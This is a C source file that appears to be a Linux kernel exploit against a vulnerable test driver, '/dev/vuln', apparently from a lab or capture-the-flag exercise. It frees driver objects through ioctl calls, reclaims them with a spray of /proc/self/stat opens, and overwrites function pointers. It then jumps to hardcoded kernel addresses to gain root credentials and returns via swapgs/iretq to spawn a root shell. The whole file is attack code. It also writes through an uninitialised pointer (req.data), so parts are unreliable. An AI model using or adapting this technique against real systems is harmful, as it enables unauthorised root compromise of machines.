#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_MAX     0x200
#define OBJ_SIZE    0x200

void get_shell() {
    char *arg[] = {"/bin/sh", NULL};
    char *env[] = {NULL};

    if(getuid() == 0) {
        printf("got dat root :D D:\n");
        execve(arg[0], arg, env);
    } else {
        printf("aint got dat root :|\n");
    }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}

void escalate_privs(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rdi, 0xffffffff81e3bfa0;"
        "movabs rax, 0xffffffff812a1050;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

typedef struct {
    int id;
    size_t size;
    char *data;
} request_t;

int main(int argc, char *argv[]) {
    int fd = open("/dev/vuln", O_RDWR);
    if(fd < 0) {
        fprintf(stderr, "error opening /dev/vuln: %m\n");
        return -1;
    }

    request_t req;

    for(int i=0; i<0x200; i++) {
        req.id = i;
        
        if(req.id == 0x6a) {
            printf("check mem\n");
            getchar();
        }

        if(ioctl(fd, CMD_ALLOC, &req)) {
            fprintf(stderr, "CMD_ALLOC failed: %m\n");
            return -1;
        }
    }

    printf("we alloced some objs\n");
    getchar();

    for(int i=0x0; i < 0x69;i++) {
        req.id = i;

        if(ioctl(fd, CMD_FREE, &req)) {
            fprintf(stderr, "CMD_FREE failed: %m\n");
            return -1;
        }
    }

    printf("deallocated 0x69 objects\n");
    getchar();

    save_state();

    int fds[0x400];
    char *statbuf[0x10];
    for(int i=0; i<0x200;i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY | O_NOCTTY);
        if(fds[i] < 0) {
            fprintf(stderr, "error opening stat: %m\n");
            return -1;
        }
    }
   
    uint64_t escalate = (uint64_t)&escalate_privs;
    printf("ret2usr func: %lx\n", escalate);
    getchar();

    req.size = 0x8;

    memset(req.data, 0x41, 0x200);
    memcpy(req.data, &escalate, sizeof(escalate));
    for(int i=0; i < 0x200;i++) {
        req.id = i;
        if(ioctl(fd, CMD_WRITE, &req)) {
            fprintf(stderr, "CMD_WRITE failed: %m\n");
            return -1;
        }
    }

    for(int i=0; i < 0x200; i++) {
        read(fds[i], statbuf, 0x10);
        printf("read: %d\n", i);
        close(fds[i]);
    }


    getchar();


    return 0;
}
